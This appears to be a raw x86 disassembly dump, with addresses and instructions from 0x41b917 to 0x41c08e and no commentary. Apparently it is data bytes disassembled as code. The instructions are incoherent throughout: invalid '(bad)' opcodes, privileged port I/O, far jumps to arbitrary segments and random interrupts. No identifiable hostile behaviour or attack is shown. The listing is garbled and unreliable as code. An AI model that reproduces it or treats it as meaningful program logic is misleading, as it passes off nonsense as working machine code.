  41b917:	(bad)  
  41b918:	mov    edx,0x92bc040e
  41b91d:	imul   di,ax,0x5f
  41b921:	es aad 0xfc
  41b924:	and    bl,BYTE PTR [eax+0x1e]
  41b927:	fisubr WORD PTR [esi+0xc]
  41b92a:	inc    edi
  41b92b:	mov    ds:0x89a9455,al
  41b930:	idiv   BYTE PTR [eax-0x4a]
  41b933:	push   0x17353c45
  41b938:	jle    0x41b949
  41b93a:	xor    DWORD PTR [esi-0x3b],esi
  41b93d:	pop    edi
  41b93e:	jecxz  0x41b8e2
  41b940:	dec    edi
  41b941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b942:	int    0x77
  41b944:	retf   
  41b945:	(bad)  
  41b946:	out    0xae,eax
  41b948:	sbb    eax,0x6a52fbf9
  41b94d:	fwait
  41b94e:	stos   BYTE PTR es:[edi],al
  41b94f:	(bad)  
  41b950:	(bad)  
  41b951:	imul   ebx,DWORD PTR ds:0x64295637,0x3c
  41b958:	inc    esi
  41b959:	sbb    edx,DWORD PTR [eax-0x3d4af52a]
  41b95f:	inc    eax
  41b960:	add    al,0xcb
  41b962:	sbb    bh,ch
  41b964:	shr    DWORD PTR [ebx],0xd8
  41b967:	retf   0x97a1
  41b96a:	stos   DWORD PTR es:[edi],eax
  41b96b:	inc    ebp
  41b96c:	dec    edx
  41b96d:	push   edi
  41b96e:	out    dx,eax
  41b96f:	out    0x2,al
  41b971:	loopne 0x41b9c4
  41b973:	sub    bh,BYTE PTR [eax-0x1af4ede]
  41b979:	xchg   ecx,eax
  41b97a:	jecxz  0x41b9db
  41b97c:	xchg   edx,eax
  41b97d:	add    DWORD PTR [ecx-0x5b],esi
  41b980:	mov    al,0x7b
  41b982:	lds    ecx,FWORD PTR [esi-0x7eeb53c2]
  41b988:	xor    eax,0x2a7cbda
  41b98d:	xchg   edi,eax
  41b98e:	mov    ds:0x90f1550c,eax
  41b993:	cdq    
  41b994:	push   cs
  41b995:	sti    
  41b996:	arpl   WORD PTR [edi-0x4d],ax
  41b999:	jg     0x41b9bc
  41b99b:	push   ds
  41b99c:	sub    BYTE PTR [ebx],dh
  41b99e:	inc    edx
  41b99f:	iret   
  41b9a0:	sbb    ah,BYTE PTR [edx+0x47a0decb]
  41b9a6:	add    al,0x26
  41b9a8:	aam    0x9c
  41b9aa:	cs jae 0x41ba2a
  41b9ad:	lahf   
  41b9ae:	rcl    ecx,cl
  41b9b0:	mov    esp,0xe1058fe6
  41b9b5:	outs   dx,BYTE PTR ds:[esi]
  41b9b6:	std    
  41b9b7:	jmp    0x41ba0d
  41b9b9:	loope  0x41b9cc
  41b9bb:	adc    DWORD PTR [esi+esi*1-0x6d],eax
  41b9bf:	mov    bl,0x48
  41b9c1:	int    0x3f
  41b9c3:	ficomp DWORD PTR [eax+0x6808f49c]
  41b9c9:	push   cs
  41b9ca:	jnp    0x41b94c
  41b9cc:	mov    ds:0x91b0e577,eax
  41b9d1:	retf   0xad9d
  41b9d4:	adc    ebx,DWORD PTR [ecx+0x1f]
  41b9d7:	and    BYTE PTR [edi-0x2636f3e3],dh
  41b9dd:	mov    al,ds:0x4e02089e
  41b9e2:	xor    BYTE PTR [ecx-0x5f],al
  41b9e5:	mov    dh,0x61
  41b9e7:	fild   QWORD PTR [ecx-0x7b7baad2]
  41b9ee:	add    BYTE PTR [esi+0x41f2b418],0xc1
  41b9f5:	inc    eax
  41b9f6:	je     0x41ba1a
  41b9f8:	mov    ecx,0x3ac27c7f
  41b9fd:	shl    dh,1
  41b9ff:	sbb    BYTE PTR [edi+0x5cb54c03],dh
  41ba05:	add    BYTE PTR [edi-0x7a508afd],bl
  41ba0b:	and    DWORD PTR [esi-0x12],edi
  41ba0e:	iret   
  41ba0f:	sahf   
  41ba10:	pop    edi
  41ba11:	xchg   DWORD PTR [eax+0x5214826c],eax
  41ba17:	ret    
  41ba18:	jmp    0xfc16:0x6740bfe
  41ba1f:	mov    ds:0x7dc72f9f,al
  41ba24:	pop    ebx
  41ba25:	inc    eax
  41ba26:	retf   
  41ba27:	int3   
  41ba28:	sub    esi,DWORD PTR [eax+0x49]
  41ba2b:	aaa    
  41ba2c:	cdq    
  41ba2d:	fwait
  41ba2e:	mov    ecx,0x4a2d5818
  41ba33:	mov    dh,0xa1
  41ba35:	pop    ss
  41ba36:	push   edx
  41ba37:	jno    0x41ba0c
  41ba39:	mov    esp,0x7d9794e7
  41ba3e:	rol    DWORD PTR [ecx],cl
  41ba40:	int    0xdd
  41ba42:	adc    al,0x8e
  41ba44:	hlt    
  41ba45:	sbb    ebp,esp
  41ba47:	call   0xd4228179
  41ba4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba4d:	xchg   ebp,eax
  41ba4e:	mov    es,WORD PTR [ebp+0x43f1dde2]
  41ba54:	(bad)  
  41ba56:	dec    ecx
  41ba57:	call   0x323bac3c
  41ba5c:	jmp    0x6c8e:0x7e8e5f85
  41ba63:	push   ebp
  41ba64:	sub    al,0x29
  41ba66:	push   eax
  41ba67:	fbstp  TBYTE PTR [ebx-0x76]
  41ba6a:	pusha  
  41ba6b:	stc    
  41ba6c:	add    al,0x13
  41ba6e:	js     0x41ba21
  41ba70:	jmp    0x9e32:0x6a7d59a
  41ba77:	pusha  
  41ba78:	stos   BYTE PTR es:[edi],al
  41ba79:	shl    BYTE PTR [edi],0x33
  41ba7c:	mov    ecx,0xf69521b4
  41ba81:	cmp    dl,BYTE PTR [esi-0x3a99fe23]
  41ba87:	push   cs
  41ba88:	pop    edx
  41ba89:	or     al,0x83
  41ba8b:	mov    cl,0x97
  41ba8d:	mov    dl,0x1f
  41ba8f:	nop
  41ba90:	sbb    DWORD PTR [ecx],ebx
  41ba92:	int3   
  41ba93:	cli    
  41ba94:	push   ecx
  41ba95:	push   ecx
  41ba96:	mov    eax,ds:0xf3a3a728
  41ba9b:	inc    ebx
  41ba9c:	inc    ecx
  41ba9d:	fcom   DWORD PTR [ecx-0x20edc2f8]
  41baa3:	stc    
  41baa4:	imul   esi,DWORD PTR [edx],0xef544cfd
  41baaa:	xchg   edx,eax
  41baab:	or     eax,DWORD PTR [ebp+0x2d65bf37]
  41bab1:	jmp    0x874128cf
  41bab6:	out    0x31,al
  41bab8:	fst    st(4)
  41baba:	xchg   BYTE PTR [esp+eiz*4+0x46],ah
  41babe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41babf:	pop    esi
  41bac0:	aad    0xf5
  41bac2:	mov    bl,0xad
  41bac4:	jnp    0x41bae2
  41bac6:	ffree  st(0)
  41bac8:	jge    0x41ba78
  41baca:	push   esp
  41bacb:	movntq (bad),mm6
  41bacc:	out    0xf2,eax
  41bace:	call   0xeaa4e963
  41bad3:	scas   eax,DWORD PTR es:[edi]
  41bad4:	xor    esi,DWORD PTR [edx+0x1d]
  41bad7:	retf   0xbfaa
  41bada:	mov    BYTE PTR [ebp-0x1d],ah
  41badd:	lds    esp,FWORD PTR [eax-0x579f3048]
  41bae3:	lea    edx,[edx+0x35d41e2f]
  41bae9:	daa    
  41baea:	lods   eax,DWORD PTR ds:[esi]
  41baeb:	imul   esi,DWORD PTR [ebp+0x6968b2e0],0x4b71634f
  41baf5:	es push ebx
  41baf7:	or     cl,BYTE PTR [ebx+0x54ebaf76]
  41bafd:	fcomp  QWORD PTR [ebx]
  41baff:	pop    edx
  41bb00:	jae    0x41bab5
  41bb02:	iret   
  41bb03:	imul   esi,edi,0x7a
  41bb06:	mov    ds:0x928f4f48,al
  41bb0b:	ror    ecx,1
  41bb0d:	nop
  41bb0e:	mov    al,ds:0x7f26d167
  41bb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb14:	cmp    esp,DWORD PTR [eax-0x20d8061]
  41bb1a:	out    0xb8,al
  41bb1c:	shl    ch,1
  41bb1e:	inc    eax
  41bb1f:	retf   
  41bb20:	ja     0x41bb8c
  41bb22:	retf   0xbc69
  41bb25:	xchg   BYTE PTR [ebx-0x1c],ah
  41bb28:	into   
  41bb29:	add    esi,esp
  41bb2b:	sbb    esi,ebx
  41bb2d:	jmp    0xeaf9e229
  41bb32:	sub    bl,0x3f
  41bb35:	jnp    0x41bb30
  41bb37:	xor    DWORD PTR [eax+0x42],esi
  41bb3a:	cdq    
  41bb3b:	js     0x41bbae
  41bb3d:	retf   
  41bb3e:	in     eax,dx
  41bb3f:	jns    0x41bb5b
  41bb41:	cmp    BYTE PTR [esi+0x6f],cl
  41bb44:	sub    eax,0x76dafc1c
  41bb49:	add    BYTE PTR [ecx+0x1],dh
  41bb4c:	repnz pop edi
  41bb4e:	jo     0x41bba8
  41bb50:	jg     0x41bb4b
  41bb52:	pop    ss
  41bb53:	xchg   esp,eax
  41bb54:	out    0x33,al
  41bb56:	nop
  41bb57:	sub    al,0xbd
  41bb59:	mov    ds:0x6319a03,eax
  41bb5e:	(bad)  
  41bb5f:	mov    ah,0x2
  41bb61:	jno    0x41baf8
  41bb63:	sbb    al,0x56
  41bb65:	mov    esi,0x2a5c244a
  41bb6a:	lods   eax,DWORD PTR ds:[esi]
  41bb6b:	inc    ebx
  41bb6c:	nop
  41bb6d:	fcom   QWORD PTR [ebx-0x4d]
  41bb70:	cmc    
  41bb71:	fdiv   DWORD PTR [ebx]
  41bb73:	dec    esp
  41bb74:	sti    
  41bb75:	and    cl,BYTE PTR [esi]
  41bb77:	xchg   esp,eax
  41bb78:	mov    ch,0xa1
  41bb7a:	jnp    0x41bba6
  41bb7c:	pop    edi
  41bb7d:	fnsave [edx-0x41c30e4e]
  41bb83:	test   ebx,ebp
  41bb85:	pop    ds
  41bb86:	inc    ecx
  41bb87:	pop    edi
  41bb88:	jb     0x41bbf6
  41bb8a:	inc    eax
  41bb8b:	mov    ds:0x4c89105,al
  41bb90:	call   0xf4750691
  41bb95:	mov    BYTE PTR ss:[eax+0x6d],bh
  41bb99:	mov    esi,0xa704cf7f
  41bb9e:	retf   0xd51e
  41bba1:	xchg   dh,cl
  41bba3:	mov    eax,ds:0x6764ae6b
  41bba8:	ror    BYTE PTR [edi],1
  41bbaa:	or     eax,0x3f7a21ed
  41bbaf:	lock out 0x5,al
  41bbb2:	sub    al,0xf5
  41bbb4:	push   cs
  41bbb5:	dec    eax
  41bbb6:	sub    DWORD PTR [ecx+eax*2-0x76],0x72
  41bbbb:	aas    
  41bbbc:	push   ds
  41bbbd:	adc    eax,0x9721a90b
  41bbc2:	dec    ebx
  41bbc3:	stos   BYTE PTR es:[edi],al
  41bbc4:	sub    ecx,DWORD PTR [eax+ebp*8]
  41bbc7:	xor    al,dh
  41bbc9:	mov    bl,0x84
  41bbcb:	inc    edi
  41bbcc:	xor    BYTE PTR [ebx-0x58314b13],bl
  41bbd2:	fcom   DWORD PTR [ecx-0x6c]
  41bbd5:	ja     0x41bbd1
  41bbd7:	test   al,0x34
  41bbd9:	or     eax,0xafa903fe
  41bbde:	out    0x1,al
  41bbe0:	stos   BYTE PTR es:[edi],al
  41bbe1:	shl    al,1
  41bbe3:	retf   
  41bbe4:	je     0x41bc35
  41bbe6:	loop   0x41bc01
  41bbe8:	fwait
  41bbe9:	inc    ecx
  41bbea:	scas   eax,DWORD PTR es:[edi]
  41bbeb:	pushf  
  41bbec:	xlat   BYTE PTR ds:[ebx]
  41bbed:	mov    DWORD PTR [edx-0x58],edx
  41bbf0:	push   0xffffffde
  41bbf2:	mov    cl,0x3d
  41bbf4:	div    DWORD PTR [edi]
  41bbf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbf7:	push   ebp
  41bbf8:	jmp    0x52b920b8
  41bbfd:	int    0x35
  41bbff:	xchg   esi,eax
  41bc00:	and    BYTE PTR [esi-0x28],ah
  41bc03:	pop    eax
  41bc04:	shr    DWORD PTR [ecx],cl
  41bc06:	mov    eax,ds:0xe48386da
  41bc0b:	sbb    al,0x9e
  41bc0d:	mov    edi,0xeb3b5d12
  41bc12:	sbb    al,0x14
  41bc14:	iret   
  41bc15:	xchg   ebx,eax
  41bc16:	nop
  41bc17:	mov    DWORD PTR [ebx-0x77],edi
  41bc1a:	enter  0x1aaf,0x65
  41bc1e:	int3   
  41bc1f:	jecxz  0x41bc5d
  41bc21:	pop    ss
  41bc22:	hlt    
  41bc23:	push   edi
  41bc24:	test   eax,0x28614a18
  41bc29:	jl     0x4b27f8e1
  41bc2f:	lods   eax,DWORD PTR ds:[esi]
  41bc30:	ret    0x80d7
  41bc33:	retf   
  41bc34:	mov    edi,0x40d5416e
  41bc39:	lahf   
  41bc3a:	mov    bh,0xf5
  41bc3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc3d:	jns    0x41bbfa
  41bc3f:	cmp    bl,bl
  41bc41:	jmp    0x478fba0c
  41bc46:	ins    BYTE PTR es:[edi],dx
  41bc47:	inc    edx
  41bc48:	lock push ecx
  41bc4a:	stc    
  41bc4b:	mov    edx,DWORD PTR [ecx+0x138560]
  41bc51:	mov    dh,0xa2
  41bc53:	adc    ch,ch
  41bc55:	mov    ds:0x68772cd8,al
  41bc5a:	mov    ebx,0x133d6d1a
  41bc5f:	xchg   BYTE PTR [ecx+ecx*4-0x4d],bh
  41bc63:	cmc    
  41bc64:	sbb    bh,BYTE PTR ds:0x75b03f90
  41bc6a:	dec    ebp
  41bc6b:	ja     0x41bc9a
  41bc6d:	inc    esp
  41bc6e:	loop   0x41bc89
  41bc70:	sub    BYTE PTR [esi+0x25567876],cl
  41bc76:	retf   0xefbf
  41bc79:	cmp    al,BYTE PTR [edx+edi*2+0xba2e3]
  41bc80:	push   es
  41bc81:	inc    ecx
  41bc82:	loop   0x41bcc5
  41bc84:	and    al,dl
  41bc86:	push   ebp
  41bc87:	cs pop ebp
  41bc89:	push   0x67
  41bc8b:	mov    bl,0x93
  41bc8d:	jo     0x41bc2a
  41bc8f:	cmp    eax,0x3bf85d55
  41bc94:	xchg   BYTE PTR [ecx-0x748eba39],cl
  41bc9a:	sub    DWORD PTR [edx],esi
  41bc9c:	lahf   
  41bc9d:	rol    ebx,0xab
  41bca0:	(bad)  
  41bca1:	dec    ebx
  41bca2:	jb     0x41bca7
  41bca4:	mov    bh,0x81
  41bca6:	push   edx
  41bca7:	in     al,dx
  41bca8:	scas   al,BYTE PTR es:[edi]
  41bca9:	adc    eax,0xf6f9e5cb
  41bcae:	std    
  41bcaf:	repz fst DWORD PTR [esi+edi*8]
  41bcb3:	retf   
  41bcb4:	pop    ss
  41bcb5:	into   
  41bcb6:	cmp    al,BYTE PTR [esi]
  41bcb8:	adc    al,0x55
  41bcba:	pop    edx
  41bcbb:	test   DWORD PTR [ecx+0x83e7d2e],esi
  41bcc1:	bound  edi,QWORD PTR [ecx]
  41bcc3:	je     0x41bd25
  41bcc5:	bound  ebp,QWORD PTR [ebp-0x28]
  41bcc8:	cli    
  41bcc9:	pop    ecx
  41bcca:	div    ch
  41bccc:	out    dx,eax
  41bccd:	xchg   ebp,eax
  41bcce:	ins    DWORD PTR es:[edi],dx
  41bccf:	adc    BYTE PTR [edi+0x12],al
  41bcd2:	pop    esp
  41bcd3:	jmp    0x60e6:0x7385b542
  41bcda:	push   ebp
  41bcdb:	push   0x5ef0f98f
  41bce0:	adc    dl,BYTE PTR [eax]
  41bce2:	push   cs
  41bce3:	inc    ebx
  41bce4:	rol    bl,1
  41bce6:	lea    esp,[ecx-0x6f9d67d3]
  41bcec:	in     eax,dx
  41bced:	mov    al,BYTE PTR [eax-0x5ab05f94]
  41bcf3:	pop    ecx
  41bcf4:	arpl   WORD PTR [edi-0x23],ax
  41bcf7:	dec    ecx
  41bcf8:	xchg   esp,eax
  41bcf9:	mov    DWORD PTR [eax-0x6fcdfdfa],eax
  41bcff:	dec    eax
  41bd00:	jp     0x41bc93
  41bd02:	nop
  41bd03:	ret    0xe1b3
  41bd06:	xor    esp,eax
  41bd08:	pop    ebx
  41bd09:	push   edi
  41bd0a:	inc    ebp
  41bd0b:	inc    edx
  41bd0c:	push   ebx
  41bd0d:	adc    eax,0x8f6b2437
  41bd12:	ins    BYTE PTR es:[edi],dx
  41bd13:	test   DWORD PTR [ecx],ebx
  41bd15:	add    BYTE PTR [edx-0x34ee615d],ah
  41bd1b:	inc    edi
  41bd1c:	push   ss
  41bd1d:	add    al,ah
  41bd1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd20:	popf   
  41bd21:	pop    es
  41bd22:	fs mov ebp,0x177df697
  41bd28:	and    al,0xbf
  41bd2a:	sbb    al,0xa2
  41bd2c:	sub    BYTE PTR ds:0xded791c9,0x4b
  41bd33:	lahf   
  41bd34:	ret    0xb35
  41bd37:	adc    esi,edi
  41bd39:	into   
  41bd3a:	sbb    eax,DWORD PTR ds:0x26492df9
  41bd40:	push   ss
  41bd41:	xchg   esi,eax
  41bd42:	out    dx,al
  41bd43:	(bad)  
  41bd44:	fcmovbe st,st(4)
  41bd46:	shl    BYTE PTR [edi+0x2854b023],cl
  41bd4c:	loope  0x41bd1c
  41bd4e:	sbb    al,0xda
  41bd50:	in     eax,dx
  41bd51:	daa    
  41bd52:	sbb    DWORD PTR [eax-0x90d675c],ebx
  41bd58:	push   esp
  41bd59:	ja     0x41bcf9
  41bd5b:	(bad)  
  41bd5c:	js     0x41bcfa
  41bd5e:	or     dh,BYTE PTR [ebp-0x17]
  41bd61:	push   0xc2acc4ff
  41bd66:	and    eax,DWORD PTR [ebp+0x6cc1e1e2]
  41bd6c:	popa   
  41bd6d:	test   eax,0xffdea900
  41bd72:	imul   ebx,ebp,0xfffffff4
  41bd75:	add    WORD PTR [ebp+0x10],dx
  41bd79:	xlat   BYTE PTR ds:[ebx]
  41bd7a:	dec    ecx
  41bd7b:	inc    ecx
  41bd7c:	je     0x41bd53
  41bd7e:	mov    ds:0xbc3c83ec,eax
  41bd83:	mov    bh,0xdb
  41bd85:	in     eax,0x17
  41bd87:	jnp    0x41bdb1
  41bd89:	push   edx
  41bd8a:	or     eax,0xe5d6eb6
  41bd8f:	vminss xmm4,xmm2,xmm3
  41bd93:	push   es
  41bd94:	repnz fwait
  41bd96:	mov    DWORD PTR [edx+0x27],esi
  41bd99:	inc    esi
  41bd9a:	imul   DWORD PTR [eax+ecx*8-0xc]
  41bd9e:	mov    eax,0x729b5803
  41bda3:	and    ecx,DWORD PTR [eax+0x4e02a075]
  41bda9:	push   ds
  41bdaa:	jecxz  0x41bdff
  41bdac:	push   edx
  41bdad:	mov    al,ds:0xf44ed912
  41bdb2:	or     eax,0x1c33dfe2
  41bdb7:	xor    edx,DWORD PTR [eax-0x3c60192d]
  41bdbd:	daa    
  41bdbe:	jp     0x41bd81
  41bdc0:	addr16 cdq 
  41bdc2:	mov    al,ds:0xf68a184d
  41bdc7:	dec    eax
  41bdc8:	test   al,0x80
  41bdca:	mov    esi,0xcefa63d1
  41bdcf:	in     al,0xb9
  41bdd1:	(bad)  
  41bdd4:	sti    
  41bdd5:	sti    
  41bdd6:	mov    al,0xb7
  41bdd8:	mov    ebp,0x97ad9e67
  41bddd:	in     eax,0x9
  41bddf:	sbb    bl,ch
  41bde1:	cmp    edi,esp
  41bde3:	pmuludq mm2,mm6
  41bde6:	popa   
  41bde7:	sub    ch,BYTE PTR [ebx-0x56]
  41bdea:	mov    ebp,0x7f943963
  41bdef:	cld    
  41bdf0:	mov    fs,WORD PTR [edi-0x6d9ab7e8]
  41bdf6:	jns    0x41bdb8
  41bdf8:	int3   
  41bdf9:	push   es
  41bdfa:	retf   0xfbf3
  41bdfd:	mov    ebp,0x4c35f348
  41be02:	outs   dx,BYTE PTR ds:[esi]
  41be03:	and    eax,0xf52ded55
  41be08:	xor    eax,0xeec99d42
  41be0d:	push   cs
  41be0e:	aaa    
  41be0f:	xor    BYTE PTR [ebx-0x2ac83012],dl
  41be15:	iret   
  41be16:	ret    
  41be17:	addr16 (bad) 
  41be19:	xor    BYTE PTR [ecx+0x59cc6e5f],ah
  41be1f:	fild   DWORD PTR [edi-0x14]
  41be22:	mov    ch,0xfb
  41be24:	aas    
  41be25:	ror    DWORD PTR [esi+0x786696d9],0xc1
  41be2c:	ret    
  41be2d:	sti    
  41be2e:	mov    ebp,0x916e8af3
  41be33:	adc    eax,0xb00bcffe
  41be38:	inc    ebp
  41be39:	adc    al,0x43
  41be3b:	sbb    ecx,edi
  41be3d:	inc    ebp
  41be3e:	push   ss
  41be3f:	add    BYTE PTR [edx+0x35bd6064],al
  41be45:	jmp    0x41be13
  41be47:	sub    edx,DWORD PTR [ecx+0x23]
  41be4a:	icebp  
  41be4b:	and    edx,edx
  41be4d:	aam    0x2c
  41be4f:	call   FWORD PTR [ecx+0x7]
  41be52:	pop    es
  41be53:	push   ecx
  41be54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be55:	add    DWORD PTR [ebp-0x59],ebp
  41be58:	pop    esp
  41be59:	add    edi,DWORD PTR [eax]
  41be5b:	inc    edx
  41be5c:	fdivr  DWORD PTR [ebp*2-0x554af25a]
  41be63:	in     eax,0x3e
  41be65:	test   eax,0xa6d327b0
  41be6a:	(bad)  
  41be6b:	sub    eax,0x17204c2c
  41be70:	jae    0x41bebc
  41be72:	dec    esi
  41be73:	fwait
  41be74:	in     al,dx
  41be75:	test   eax,0xcc7478a4
  41be7a:	ins    BYTE PTR es:[edi],dx
  41be7b:	sub    eax,0xf1448235
  41be80:	add    esi,DWORD PTR ds:0x8de82893
  41be86:	pop    ebx
  41be87:	jnp    0x41be24
  41be89:	xchg   DWORD PTR [edi-0x3a47b740],ebx
  41be8f:	pusha  
  41be90:	pop    ds
  41be91:	arpl   WORD PTR [edx+ecx*1],bx
  41be94:	aas    
  41be95:	xor    al,0xe
  41be97:	xchg   esi,eax
  41be98:	inc    edi
  41be99:	xchg   ebp,eax
  41be9a:	dec    edx
  41be9b:	mov    dl,0x8
  41be9d:	add    BYTE PTR [ebx-0x69a253ab],bh
  41bea3:	push   esp
  41bea4:	nop
  41bea5:	shl    esp,1
  41bea7:	(bad)  
  41bea8:	xchg   ebx,eax
  41bea9:	shl    DWORD PTR [ebx+edi*4+0x339e4b52],cl
  41beb0:	popf   
  41beb1:	shl    eax,cl
  41beb3:	lods   al,BYTE PTR ds:[esi]
  41beb4:	adc    BYTE PTR [edx+0x570ba05f],bl
  41beba:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bebc:	push   edi
  41bebd:	mov    esp,0x486d0c26
  41bec2:	aam    0xa4
  41bec4:	lds    edx,FWORD PTR [edx]
  41bec6:	xor    eax,0x294a3da4
  41becb:	push   0xcb9f4a22
  41bed0:	les    eax,FWORD PTR [esp+ebx*8-0xe149bcb]
  41bed7:	arpl   bx,dx
  41bed9:	or     edx,DWORD PTR [edi+0x78]
  41bedc:	ins    DWORD PTR es:[edi],dx
  41bedd:	das    
  41bede:	call   0xc81bae12
  41bee3:	nop
  41bee4:	ins    BYTE PTR es:[edi],dx
  41bee5:	retf   0x2260
  41bee8:	icebp  
  41bee9:	mov    bh,0xea
  41beeb:	xor    eax,ebp
  41beed:	shr    BYTE PTR [ebx+0x50],1
  41bef0:	sub    BYTE PTR [esi+0x31669c1c],0x8e
  41bef7:	xchg   esp,eax
  41bef8:	arpl   dx,di
  41befa:	lea    eax,[edi]
  41befc:	shl    BYTE PTR ss:[esi-0x37],1
  41bf00:	paddsb mm4,mm5
  41bf03:	add    ah,BYTE PTR [esi+0x5a]
  41bf06:	mov    ebp,0x88480126
  41bf0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf0c:	mov    al,ds:0x10f337c2
  41bf11:	rol    BYTE PTR [edi-0x1a],0x12
  41bf15:	cmp    edi,esp
  41bf17:	mov    eax,0x8c4497f7
  41bf1c:	retf   
  41bf1d:	out    0x68,eax
  41bf1f:	xchg   edx,eax
  41bf20:	stos   BYTE PTR es:[edi],al
  41bf21:	pop    ss
  41bf22:	jb     0x41bf3f
  41bf24:	js     0x41bf7d
  41bf26:	enter  0xbf1d,0x74
  41bf2a:	ror    DWORD PTR [eax+ebp*2+0x74],1
  41bf2e:	jmp    0xa0ef68e9
  41bf33:	xor    DWORD PTR [edi],esp
  41bf35:	push   0x6e
  41bf37:	mov    bl,0xc6
  41bf39:	jo     0x41beea
  41bf3b:	jo     0x41beea
  41bf3d:	cld    
  41bf3e:	popa   
  41bf3f:	adc    BYTE PTR [esi],dl
  41bf41:	cmp    BYTE PTR [esp+ebx*8+0x65],0x39
  41bf46:	sar    DWORD PTR [edi],1
  41bf48:	shl    BYTE PTR [edx-0x32fc9157],1
  41bf4e:	sub    dl,BYTE PTR [edx]
  41bf50:	sub    DWORD PTR [eax],ebp
  41bf52:	je     0x41bf18
  41bf54:	and    bl,BYTE PTR [esi+0x682ad3b4]
  41bf5a:	mov    ds:0x38f09fcc,eax
  41bf5f:	and    ecx,DWORD PTR [eax-0x32]
  41bf62:	and    dl,al
  41bf64:	shr    DWORD PTR [edi-0x15],0x88
  41bf68:	pop    es
  41bf69:	mov    bl,BYTE PTR [ecx]
  41bf6b:	jb     0x41bf18
  41bf6d:	lock jmp 0x1209:0xfbe1fa96
  41bf75:	mov    edx,0x1f981b8a
  41bf7a:	shl    DWORD PTR [edi+eax*1-0x7960fbc],cl
  41bf81:	fwait
  41bf82:	push   eax
  41bf83:	sbb    al,0x63
  41bf85:	mov    bl,0xb6
  41bf87:	out    0x63,eax
  41bf89:	mov    ?,WORD PTR [edx+0x1a]
  41bf8c:	loopne 0x41bfbc
  41bf8e:	clc    
  41bf8f:	jb     0x41bf93
  41bf91:	int    0x4e
  41bf93:	pop    ecx
  41bf94:	pop    esp
  41bf95:	lods   al,BYTE PTR ds:[esi]
  41bf96:	push   es
  41bf97:	cmc    
  41bf98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf99:	add    edx,DWORD PTR [ecx+0x5a]
  41bf9c:	sbb    DWORD PTR [ebx-0x54],0xd8fa8ba0
  41bfa3:	stos   DWORD PTR es:[edi],eax
  41bfa4:	and    al,0x57
  41bfa6:	popa   
  41bfa7:	add    DWORD PTR [ecx+ebx*2],ecx
  41bfaa:	mov    eax,ds:0x713b57ba
  41bfaf:	test   BYTE PTR [edx-0x3c93000d],dh
  41bfb5:	adc    edi,DWORD PTR es:[edx]
  41bfb8:	push   ss
  41bfb9:	or     DWORD PTR [edx],ebx
  41bfbb:	loopne 0x41bffc
  41bfbd:	xchg   BYTE PTR [ecx-0x2e],bl
  41bfc0:	sbb    eax,0xfe1d8d9f
  41bfc5:	jae    0x41bf71
  41bfc7:	dec    ecx
  41bfc8:	cmp    eax,0x8582ea82
  41bfcd:	push   0xffffffe4
  41bfcf:	inc    edi
  41bfd0:	xchg   edx,eax
  41bfd1:	sbb    DWORD PTR [esi+eiz*2+0x2d],0xffffffc5
  41bfd6:	nop
  41bfd7:	les    ecx,FWORD PTR [ebx]
  41bfd9:	push   eax
  41bfda:	pop    edi
  41bfdb:	dec    edi
  41bfdc:	jp     0x41bfd2
  41bfde:	repnz in al,0x5
  41bfe1:	jmp    0x41c025
  41bfe3:	sub    al,0x13
  41bfe5:	pushf  
  41bfe6:	ficom  WORD PTR [esi-0x424610eb]
  41bfec:	call   0x3c3bba6c
  41bff1:	push   es
  41bff2:	and    eax,0xd77ddd42
  41bff7:	data16 and bl,0xa7
  41bffb:	jns    0x41bfb2
  41bffd:	call   0xd4af0777
  41c002:	sar    DWORD PTR [eax],1
  41c004:	fmul   DWORD PTR [esi-0x43]
  41c007:	sub    esi,DWORD PTR [ecx-0x53]
  41c00a:	loope  0x41c062
  41c00c:	mov    eax,0x6a0bb740
  41c011:	out    dx,al
  41c012:	in     al,0x72
  41c014:	jp     0x41bfe8
  41c016:	popf   
  41c017:	xor    eax,0xb15aa72d
  41c01c:	repnz retf 
  41c01e:	outs   dx,DWORD PTR ds:[esi]
  41c01f:	push   esi
  41c020:	inc    edi
  41c021:	pop    ss
  41c022:	push   ecx
  41c023:	stos   DWORD PTR es:[edi],eax
  41c024:	sbb    eax,0x1758413e
  41c029:	fcmovb st,st(2)
  41c02b:	aad    0x59
  41c02d:	out    dx,al
  41c02e:	inc    esp
  41c02f:	xchg   DWORD PTR [edx+ebx*2-0x28],ecx
  41c033:	out    0xd9,eax
  41c035:	scas   al,BYTE PTR es:[edi]
  41c036:	pusha  
  41c037:	lea    eax,ds:0x15bce654
  41c03d:	jle    0x41c064
  41c03f:	or     al,0x9b
  41c041:	jp     0x41bfd5
  41c043:	outs   dx,BYTE PTR ds:[esi]
  41c044:	ficomp WORD PTR [edx]
  41c046:	jle    0x41c0b0
  41c048:	nop
  41c049:	jae    0x41bfcc
  41c04b:	call   0x50a8:0xbc26b39d
  41c052:	push   edx
  41c053:	stc    
  41c054:	imul   esp,DWORD PTR [edx+eax*4+0x1b017107],0xfffffffc
  41c05c:	je     0x41c066
  41c05e:	and    BYTE PTR [edx],dh
  41c060:	jge    0x41c015
  41c062:	add    esp,DWORD PTR ds:[ecx]
  41c065:	sti    
  41c066:	mov    al,0x6e
  41c068:	fmul   st(2),st
  41c06a:	xchg   ebx,eax
  41c06b:	imul   edi,ebp,0xffffffd8
  41c06e:	mov    BYTE PTR ds:0x45a11d57,al
  41c074:	ins    DWORD PTR es:[edi],dx
  41c075:	adc    al,0xf7
  41c077:	push   ds
  41c078:	mov    cl,0xaa
  41c07a:	nop
  41c07b:	loope  0x41c0a5
  41c07d:	or     BYTE PTR [ebx-0x4d],bh
  41c080:	ja     0x41c034
  41c082:	out    0xc0,eax
  41c084:	mov    ebx,ecx
  41c086:	push   esi
  41c087:	inc    edx
  41c088:	cmp    eax,0xe3544f8f
  41c08d:	(bad)  
  41c08e:	mov    ds:0xa228c0bd,eax
